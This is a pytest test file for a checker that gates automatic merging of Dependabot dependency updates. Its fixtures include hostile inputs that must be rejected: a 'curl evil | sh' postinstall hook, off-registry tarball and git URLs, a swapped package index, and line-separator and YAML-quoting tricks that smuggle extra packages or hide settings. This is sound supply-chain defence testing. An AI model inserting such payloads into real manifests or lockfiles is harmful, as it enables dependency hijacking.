import json

import pytest

from qqroll import land_check
from tests_support import CLEAN_COMMIT, HEAD_RULES, LOCK_BASE, LOCK_HEAD, LOCK_PATCH, LOCKS, NPM_PATCH, PIP_PATCH, RULES, npm_file

ALLOWED_NPM = [["package.json", "npm-manifest"], ["pnpm-lock.yaml", "npm-lock"]]
ALLOWED_PIP = [["requirements*.txt", "pip-requirements"]]
ENV = {"SENDER": "dependabot[bot]", "TRIGGER": "dependabot[bot]", "CHANGED": "2",
       "UPDATE_TYPE": "version-update:semver-patch", "PREV_VERSION": "16.3.7", "NEW_VERSION": "16.3.8",
       "DEP_NAMES": "next"}
FILES = [npm_file(), npm_file("pnpm-lock.yaml", LOCK_PATCH)]
PIP_ENV = {"CHANGED": "1", "DEP_NAMES": "requests"}
NPM_PATCH_TYPES = '@@ -1 +1 @@\n-      "@types/node": "^26.6.4",\n+      "@types/node": "^26.6.5",\n'


def check(env=None, files=None, commits=None, rules=None, allowed=None, head_rules=None, locks=None):
    return land_check.problems({**ENV, **(env or {})}, FILES if files is None else files,
                               [CLEAN_COMMIT] if commits is None else commits, RULES if rules is None else rules,
                               allowed or ALLOWED_NPM, HEAD_RULES if head_rules is None else head_rules,
                               LOCKS if locks is None else locks)


def test_a_clean_roll_is_clean():
    assert check() == []
    assert check(env=PIP_ENV, files=[npm_file("requirements-dev.txt", PIP_PATCH)], allowed=ALLOWED_PIP) == []


# --- B-1: identity ----------------------------------------------------------------------------

@pytest.mark.parametrize("env", [{"SENDER": "mallory"}, {"TRIGGER": "mallory"}])
def test_someone_else_triggering_is_not_clean(env):
    assert "not Dependabot" in check(env=env)[0]


@pytest.mark.parametrize("commit", [
    dict(CLEAN_COMMIT, committer={"login": "mallory"}),        # authored as Dependabot, committed by Mallory
    dict(CLEAN_COMMIT, commit={"verification": {"verified": False}}),
    dict(CLEAN_COMMIT, author=None),
])
def test_a_commit_not_made_by_github_for_dependabot_is_not_clean(commit):
    assert any("not a GitHub-made Dependabot commit" in p for p in check(commits=[commit]))


def test_a_second_commit_on_top_is_not_clean():
    assert any("2 commits" in p for p in check(commits=[CLEAN_COMMIT, CLEAN_COMMIT]))


# --- S-1: what changed ------------------------------------------------------------------------

@pytest.mark.parametrize("extra", [
    {"status": "added"}, {"status": "removed"}, {"status": "renamed", "previous_filename": ".github/x.yml"},
    {"previous_filename": "scripts/build.js"},
])
def test_only_modified_files_without_renames(extra):
    assert any("only modified files" in p for p in check(files=[npm_file(**extra), FILES[1]]))


def test_listed_files_must_match_the_changed_count():
    assert any("changes 3 files and 2 were listed" in p for p in check(env={"CHANGED": "3"}))
    assert any("at most 20" in p for p in check(env={"CHANGED": "21"}, files=[npm_file()] * 21))


@pytest.mark.parametrize("name", ["app/package.json", "requirements/x.txt", "pnpm-workspace.yaml", "pyproject.toml"])
def test_other_files_are_not_dependency_files(name):
    assert any("not a dependency file" in p
               for p in check(env={"CHANGED": "1"}, files=[npm_file(name)], allowed=ALLOWED_NPM + ALLOWED_PIP))


def test_a_file_without_a_diff_is_not_clean():
    assert any("no diff to check" in p for p in check(files=[npm_file(patch=None), FILES[1]]))


# --- S-2: what the lines say ------------------------------------------------------------------

@pytest.mark.parametrize("line", [
    '+    "postinstall": "curl evil | sh",', '-    "test": "vitest",', '+    "next": "https://evil/next.tgz",',
    '+    "next": "github:evil/next",', '+    "next": "file:../next",',
])
def test_package_json_lines_must_be_versions(line):
    assert any("not a version line" in p for p in check(files=[npm_file(patch=f"@@ -1 +1 @@\n{line}\n"), FILES[1]]))


@pytest.mark.parametrize("line", ["+    tarball: https://evil/next.tgz", "+    resolution: {repo: git+ssh://x}"])
def test_lockfile_must_stay_on_the_registry(line):
    assert any("non-registry resolution" in p
               for p in check(files=[FILES[0], npm_file("pnpm-lock.yaml", f"@@ -1 +1 @@\n{line}\n")]))


@pytest.mark.parametrize("line", ["+--index-url https://evil/simple", "+requests @ https://evil/r.whl",
                                  "+-e git+https://evil/r", "+requests>=2; python_version > '3'"])
def test_requirements_lines_must_be_pins(line):
    files = [npm_file("requirements.txt", f"@@ -1 +1 @@\n{line}\n")]
    assert any("not a version line" in p for p in check(env=PIP_ENV, files=files, allowed=ALLOWED_PIP))


@pytest.mark.parametrize("line", [
    "-requests==2.32.4 # \\", "+requests==2.32.5 # \\",  # pip would join the next line into the comment
    "+requests==2.32.5#x",                               # pip reads "#x" as part of the version
])
def test_requirements_comments_cannot_swallow_lines(line):
    other = "+requests==2.32.5" if line.startswith("-") else "-requests==2.32.4"
    files = [npm_file("requirements.txt", f"@@ -1 +1 @@\n{line}\n{other}\n")]
    assert any("not a version line" in p for p in check(env=PIP_ENV, files=files, allowed=ALLOWED_PIP))


@pytest.mark.parametrize("sep", ["\x0c", "\r", "\x0b", "\x1c", "\x85", "\u2028"])
@pytest.mark.parametrize("added", ["requests==2.32.5{sep}evil==1.0", "requests==2.32.5 # x{sep}evil==1.0"])
def test_a_changed_line_cannot_hide_a_second_line(sep, added):
    """pip splits requirement files with str.splitlines, so these would add evil==1.0."""
    patch = f"@@ -1 +1 @@\n-requests==2.32.4\n+{added.format(sep=sep)}\n"
    files = [npm_file("requirements.txt", patch)]
    assert any("control or line-separator" in p for p in check(env=PIP_ENV, files=files, allowed=ALLOWED_PIP))


def test_crlf_patches_still_work():
    patch = PIP_PATCH.replace("\n", "\r\n")
    assert check(env=PIP_ENV, files=[npm_file("requirements.txt", patch)], allowed=ALLOWED_PIP) == []


@pytest.mark.parametrize("option", ["--index-url https://pypi.example/simple", "--require-hashes", "--constraint c.txt"])
def test_a_removed_option_line_is_checked(option):
    """A removed line starting with -- shows as ---... in the patch; it is content, not a file header."""
    patch = f"@@ -1,2 +1 @@\n-{option}\n-requests==2.32.4\n+requests==2.32.5\n"
    files = [npm_file("requirements.txt", patch)]
    assert any("not a version line" in p for p in check(env=PIP_ENV, files=files, allowed=ALLOWED_PIP))


def test_file_headers_before_the_first_hunk_are_skipped():
    patch = "--- a/requirements.txt\n+++ b/requirements.txt\n" + PIP_PATCH
    assert check(env=PIP_ENV, files=[npm_file("requirements.txt", patch)], allowed=ALLOWED_PIP) == []


def test_requirements_keep_comments_and_extras():
    patch = "@@ -1 +1 @@\n-fastapi[all]>=0.141.1  # bump deliberately\n+fastapi[all]>=0.141.2  # bump deliberately\n"
    files = [npm_file("requirements.txt", patch)]
    assert check(env={"CHANGED": "1", "DEP_NAMES": "fastapi"}, files=files, allowed=ALLOWED_PIP) == []


@pytest.mark.parametrize("patch", [
    "@@ -1 +1,2 @@\n-requests==2.32.4\n+requests==2.32.5\n+evil==1.0.0\n",  # R-1: a new requirement
    "@@ -1 +1 @@\n-requests==2.32.4\n+evil==2.32.5\n",
    "@@ -0,0 +1 @@\n+evil==1.0.0\n",
    "@@ -1 +1 @@\n-requests==2.32.4\n+requests[socks,security]==2.32.5\n",  # extras install more packages
    "@@ -1 +1 @@\n-requests[socks]==2.32.4\n+requests[s0cks]==2.32.5\n",
    "@@ -1 +1 @@\n-requests==2.32.4\n+requests>=0\n",                        # a pin loosened
    "@@ -1 +1 @@\n-requests>=2.32,<3\n+requests>=2.33\n",
    "@@ -1 +1 @@\n-requests==2.32.4  # keep\n+requests==2.32.5\n",
])
def test_requirements_entries_only_change_version(patch):
    files = [npm_file("requirements.txt", patch)]
    assert any("reshapes entries" in p for p in check(env=PIP_ENV, files=files, allowed=ALLOWED_PIP))


def test_requirements_names_compare_normalized():
    patch = "@@ -1 +1 @@\n-Typing_Extensions==4.14.0\n+typing-extensions==4.14.1\n"
    files = [npm_file("requirements.txt", patch)]
    assert check(env={"CHANGED": "1", "DEP_NAMES": "typing_extensions"}, files=files, allowed=ALLOWED_PIP) == []


def test_requirements_change_only_the_bumped_dependency():
    patch = "@@ -1,2 +1,2 @@\n-requests==2.32.4\n-urllib3==2.5.0\n+requests==2.32.5\n+urllib3==1.26.0\n"
    files = [npm_file("requirements.txt", patch)]
    assert any("not the bumped dependency" in p for p in check(env=PIP_ENV, files=files, allowed=ALLOWED_PIP))
    assert any("not the bumped dependency" in p
               for p in check(env={"CHANGED": "1", "DEP_NAMES": ""}, files=[npm_file("requirements.txt", PIP_PATCH)],
                              allowed=ALLOWED_PIP))


# --- S-3: how big the bump is -----------------------------------------------------------------

@pytest.mark.parametrize("env, why", [
    ({"UPDATE_TYPE": "version-update:semver-major"}, "only patch and minor"),
    ({"UPDATE_TYPE": ""}, "only patch and minor"),
    ({"UPDATE_TYPE": "version-update:semver-minor", "PREV_VERSION": "0.5.1"}, "0.x minors can break"),
    ({"UPDATE_TYPE": "version-update:semver-minor", "PREV_VERSION": "v0.5.1"}, "0.x minors can break"),
    ({"UPDATE_TYPE": "version-update:semver-minor", "PREV_VERSION": ""}, "0.x minors can break"),
    ({"UPDATE_TYPE": "version-update:semver-patch", "PREV_VERSION": "0.0.3"}, "0.0.x patches can break"),
    ({"UPDATE_TYPE": "version-update:semver-patch", "PREV_VERSION": "0.0"}, "0.0.x patches can break"),
    ({"UPDATE_TYPE": "version-update:semver-patch", "PREV_VERSION": ""}, "0.0.x patches can break"),
    ({"DEP_NAMES": "next, react"}, "several dependencies"),
])
def test_risky_bumps_go_to_a_human(env, why):
    assert any(why in p for p in check(env=env))


def test_a_minor_bump_past_1_0_is_clean():
    def bump(prev, new, update):
        env = {"UPDATE_TYPE": f"version-update:semver-{update}", "PREV_VERSION": prev, "NEW_VERSION": new}
        base = LOCK_BASE.replace("16.3.7", prev).replace("^" + prev, "^" + prev)
        return check(env=env, locks={"pnpm-lock.yaml": (base, base.replace(prev, new))})
    assert bump("16.2.4", "16.3.0", "minor") == []
    assert bump("0.5.1", "0.5.2", "patch") == []


@pytest.mark.parametrize("line", [
    "+    resolution: {commit: abc, repo: git@github.com:a/b.git, type: git}",
    "+    resolution: {directory: ../x, type: directory}",
])
def test_lockfile_non_registry_forms(line):
    files = [npm_file(), npm_file("pnpm-lock.yaml", "@@ -1 +1 @@\n-  x\n" + line + "\n")]
    assert any("non-registry resolution" in p for p in check(env={"CHANGED": "2"}, files=files))  # npm


@pytest.mark.parametrize("patch", [
    '@@ -1,2 +1,3 @@\n-    "next": "^16.3.7",\n+    "next": "^16.3.8",\n+    "evil": "1.0.0",\n',
    '@@ -1 +1 @@\n-    "next": "^16.3.7",\n+    "test": "0",\n',
    '@@ -1 +1 @@\n-    "next": "^16.3.7",\n+    "next": "16.3.8",\n',   # range prefix dropped
])
def test_manifest_entries_only_change_version(patch):
    assert any("reshapes entries" in p for p in check(files=[npm_file(patch=patch)]))


def test_manifest_changes_only_the_bumped_dependency():
    patch = '@@ -1,2 +1,2 @@\n-    "next": "^16.3.7",\n-    "react": "^19.2.0",\n+    "next": "^16.3.8",\n+    "react": "^18.0.0",\n'
    assert any("not the bumped dependency" in p for p in check(files=[npm_file(patch=patch), FILES[1]]))


# --- R-5: the lockfile moves only the bumped dependency -------------------------------------

def lock_check(head, base=LOCK_BASE, env=None):
    return check(env=env, locks={"pnpm-lock.yaml": (base, head)})


TYPES_ENV = {"DEP_NAMES": "@types/node", "PREV_VERSION": "26.6.4", "NEW_VERSION": "26.6.5"}


def test_a_clean_lockfile_bump_is_clean():
    assert lock_check(LOCK_HEAD) == []
    # A bump of a peer moves it inside other entries' peer suffixes too, as in innernet's lockfile.
    scoped = LOCK_BASE.replace("26.6.4", "26.6.5")
    assert "version: 16.3.7(@types/node@26.6.5)(react@19.3.0)" in scoped
    assert check(env=TYPES_ENV, files=[npm_file(patch=NPM_PATCH_TYPES), FILES[1]],
                 locks={"pnpm-lock.yaml": (LOCK_BASE, scoped)}) == []


def test_innernets_lockfile_shape_reads_and_bumps(tmp_path):
    import pathlib
    real = pathlib.Path(__file__).with_name("innernet-pnpm-lock.yaml").read_text()
    assert land_check.lock_leaves(real)
    bumped = real.replace("@types/node@26.6.4", "@types/node@26.6.5").replace(
        "specifier: ^26.6.4\n        version: 26.6.4", "specifier: ^26.6.5\n        version: 26.6.5")
    assert land_check.lock_problems("x", real, bumped, "@types/node", "26.6.4", "26.6.5") == []
    assert land_check.lock_problems("x", real, bumped, "@types/node", "26.6.4", "26.6.6")


@pytest.mark.parametrize("edit, where", [
    (("version: 19.3.0\n", "version: 19.3.1\n"), "importers/./dependencies/react/version"),     # moves react too
    (("specifier: ^19.3.0", "specifier: ^19.4.0"), "importers/./dependencies/react/specifier"),
    (("autoInstallPeers: true", "autoInstallPeers: false"), "settings/autoInstallPeers"),
    (("lockfileVersion: '9.0'", "lockfileVersion: '6.0'"), "lockfileVersion"),
    (("    devDependencies:\n", "    devDependencies:\n      evil:\n        specifier: 1.0.0\n        version: 1.0.0\n"),
     "importers/./devDependencies/evil"),                                                       # adds a package
    (("specifier: ^16.3.8", "specifier: 16.3.8"), "importers/./dependencies/next/specifier"),  # pin reshaped
    (("version: 16.3.8(@types/node@26.6.4)(react@19.3.0)", "version: link:../next"), "importers/./dependencies/next/version"),
    (("importers:\n", "overrides:\n  react: 18.0.0\n\nimporters:\n"), "overrides/react"),
    (("specifier: ^16.3.8", "specifier: ^99.0.0"), "importers/./dependencies/next/specifier"),  # not the new version
    (("version: 16.3.8(@types", "version: 15.0.0(@types"), "importers/./dependencies/next/version"),  # downgrade
    (("version: 16.3.8(@types", "version: 17.0.0(@types"), "importers/./dependencies/next/version"),  # major
    (("(react@19.3.0)\n      react:", "(evil@1.0.0)\n      react:"), "importers/./dependencies/next/version"),
    (("version: 26.6.4", "version: 26.6.4(evil@1.0.0)"), "importers/./devDependencies/@types/node/version"),
])
def test_lockfile_changes_beyond_the_bump_are_not_clean(edit, where):
    assert any(json.dumps(where) in p for p in lock_check(LOCK_HEAD.replace(*edit, 1)))


def test_the_bumped_name_must_match():
    env = {"DEP_NAMES": "react", "PREV_VERSION": "19.3.0", "NEW_VERSION": "19.3.1"}
    assert any("importers/./dependencies/next/version" in p for p in lock_check(LOCK_HEAD, env=env))


@pytest.mark.parametrize("text", [
    "importers:\n  .:\n    dependencies:\n      next 16\n", "importers:\n  'next:\n", "a: 1\na: 2\n",
    "a:\n  b: \x0c1\n", "- top\n",
    "a:\n  b: 'x\n#'\n", "a:\n  b: {c: 1,\n  d: 2}\n", "a:\n  b: [x,\n  y]\n",        # values over lines
    'a:\n  b: "x"\n', "a:\n  b: x\\y\n", "a:\n  b: |\n    x\n", "a: &x\n  b: 1\nc: *x\n", "a: !!str 1\n",
    "a :\n  b: 1\n", "'a'b: 1\n", "a:\n  - 'x\n",
    "a:\n  b: [x', 'y]\n", "a:\n  b: x'y\n", "a:\n  b: 'x' y\n",                       # quotes mid-word
    "a:\n  b: [x, #]\n  c]\n", "a:\n  b: 1\n# c\n",                                    # comments
    "a:\n  b: c\n  - d\n", "a:\n  b: c\n    d: e\n", "a:\n  b: 1\n   c: 2\n",           # scalars continued
    "a:\n  - b\n  c: 1\n", "a:\n  - b\n    c: 1\n",                                    # items and keys mixed
    "a:\n  b:c: d\n", "a:\n  <<: {x: 1}\n", "a:\n  b: [&x 1]\n", "a:\n  b: [*x]\n", "a:\n  b: {c: !t 1}\n",
])
def test_an_unreadable_lockfile_is_not_clean(text):
    assert any("not a lockfile this check can read" in p for p in lock_check(text))


def test_pnpms_own_forms_read():
    leaves = land_check.lock_leaves("a:\n  'b''c': 'd''e'\n  f: {g: '>=1', h: [x, y]}\n  i:\n    - 'j'\n")
    assert leaves[("a", "b'c")] == "'d''e'" and leaves[("a", "i", "-")] == "'j'\n"


def test_a_lockfile_hiding_settings_in_a_multiline_value_is_not_clean():
    """YAML would read everything from the open quote to the #" line as one value, dropping settings."""
    hidden = LOCK_HEAD.replace("settings:", "packages:\n  evil@1.0.0:\n    resolution: \'x\n\nsettings:", 1)
    hidden = hidden.replace("importers:", "#\'\nimporters:", 1)
    assert any("not a lockfile this check can read" in p for p in lock_check(hidden))


def test_a_lockfile_hiding_settings_in_a_mid_word_quote_is_not_clean():
    """YAML opens a quote at 'y] and reads on to the #'] line, dropping settings (review of #12)."""
    hidden = LOCK_HEAD.replace("settings:", "packages:\n  evil@1.0.0:\n    cpu: [x', 'y]\n\nsettings:", 1)
    hidden = hidden.replace("importers:", "#']\nimporters:", 1)
    assert any("not a lockfile this check can read" in p for p in lock_check(hidden))


@pytest.mark.parametrize("line", ["+    resolution: {'directory': ../evil, 'type': 'directory'}",
                                  "+    resolution: {'repo': x, 'type': 'git'}"])
def test_quoted_keys_do_not_get_past_the_registry_check(line):
    files = [FILES[0], npm_file("pnpm-lock.yaml", f"@@ -1 +1 @@\n-  x\n{line}\n")]
    assert any("non-registry resolution" in p for p in check(files=files))


def test_peer_versions_may_move_only_to_the_new_version():
    head = LOCK_BASE.replace("react@19.3.0", "react@19.3.1").replace(
        "specifier: ^19.3.0\n        version: 19.3.0", "specifier: ^19.3.1\n        version: 19.3.1")
    assert land_check.lock_problems("x", LOCK_BASE, head, "react", "19.3.0", "19.3.1") == []
    moved = head.replace("(react@19.3.1)", "(react@99.9.9)")
    assert any("next/version" in p for p in land_check.lock_problems("x", LOCK_BASE, moved, "react", "19.3.0", "19.3.1"))


def test_an_escaped_tarball_is_not_clean():
    line = '+    resolution: {integrity: sha512-x, "tarball": "https:\\/\\/evil.example\\/next.tgz"}'
    files = [FILES[0], npm_file("pnpm-lock.yaml", f"@@ -1 +1 @@\n-  x\n{line}\n")]
    assert any("non-registry resolution" in p for p in check(files=files))
    head = LOCK_HEAD.replace("{integrity: sha512-new}", line[17:])
    assert any("not a lockfile this check can read" in p for p in lock_check(head))


def test_a_lockfile_not_read_is_not_clean():
    assert any("lockfile contents were not read" in p for p in check(locks={}))
    assert any("exactly one dependency" in p for p in check(env={"DEP_NAMES": ""}))


def test_lock_leaves_reads_innernets_shape():
    leaves = land_check.lock_leaves(LOCK_BASE)
    assert leaves[("importers", ".", "devDependencies", "@types/node", "version")] == "26.6.4"
    assert leaves[("packages", "next@16.3.7", "bundledDependencies", "-")] == "a\n"
    assert leaves[("packages", "next@16.3.7", "engines")] == "{node: '>=20.9.0'}"


# --- S-4: something must gate it --------------------------------------------------------------

@pytest.mark.parametrize("rules", [
    [], [{"type": "pull_request", "parameters": {}}],
    [{"type": "required_status_checks", "parameters": {"required_status_checks": [{"context": "tests"}]}}],
    # bound to GitHub Actions: any workflow's GITHUB_TOKEN can create that check run
    [{"type": "required_status_checks",
      "parameters": {"required_status_checks": [{"context": "tests", "integration_id": 15368}]}}],
    [{"type": "required_status_checks",
      "parameters": {"required_status_checks": [{"context": "tests", "integration_id": 0}]}}],
    [{"type": "workflows", "parameters": {"workflows": []}}],
    [{"type": "workflows", "parameters": {"workflows": [{"path": ".github/workflows/gate.yml", "ref": "main"}]}}],
])
def test_no_unforgeable_gate_is_not_clean(rules):
    assert any("any workflow could fake the gate" in p for p in check(rules=rules))


def test_a_required_workflow_gates_it():
    pinned = {"path": ".github/workflows/gate.yml", "repository_id": 1, "sha": "a" * 40}
    assert check(rules=[{"type": "workflows", "parameters": {"workflows": [pinned]}}]) == []


@pytest.mark.parametrize("head_rules", [[], [{"type": "update"}], [{"type": "non_fast_forward"}]])
def test_writable_pr_branch_is_not_clean(head_rules):
    assert any("could swap its commit" in p for p in check(head_rules=head_rules))


# --- main -------------------------------------------------------------------------------------

def test_read_locks_reads_the_merge_base_and_head(monkeypatch):
    calls = []

    def fake_gh(*args):
        calls.append(args)
        if "compare" in args[0]:
            return "b" * 40 + "\n"
        return {f"ref={'b' * 40}": LOCK_BASE, f"ref={'c' * 40}": LOCK_HEAD}[args[-1].split("?")[1]]
    monkeypatch.setattr(land_check, "gh", fake_gh)
    env = {"GITHUB_REPOSITORY": "quirq-ai/innernet", "BASE_SHA": "a" * 40, "HEAD_SHA": "c" * 40}
    assert land_check.read_locks(env, FILES, ALLOWED_NPM) == LOCKS
    assert calls[0] == (f"repos/quirq-ai/innernet/compare/{'a' * 40}...{'c' * 40}", "--jq", ".merge_base_commit.sha")
    assert land_check.read_locks(env, [FILES[0]], ALLOWED_NPM) == {}
    monkeypatch.setattr(land_check, "gh", lambda *a: "main\n")
    with pytest.raises(ValueError, match="not a commit sha"):
        land_check.read_locks(env, FILES, ALLOWED_NPM)


def test_main_writes_the_output_and_fails_closed_on_bad_data(tmp_path, monkeypatch, capsys):
    for name, data in [("files", [FILES]), ("commits", [[CLEAN_COMMIT]]), ("rules", [RULES]), ("head_rules", [HEAD_RULES])]:
        (tmp_path / f"{name}.json").write_text(json.dumps(data))
    out = tmp_path / "out"
    monkeypatch.setattr(land_check, "read_locks", lambda env, files, allowed: LOCKS)
    env = {**ENV, "QQ_DIR": str(tmp_path), "QQ_ALLOWED": json.dumps(ALLOWED_NPM), "GITHUB_OUTPUT": str(out)}
    for k, v in env.items():
        monkeypatch.setenv(k, v)
    assert land_check.main() == 0
    assert out.read_text() == "clean=true\n"
    (tmp_path / "rules.json").write_text('{"message": "Not Found"}')
    with pytest.raises(ValueError):
        land_check.main()
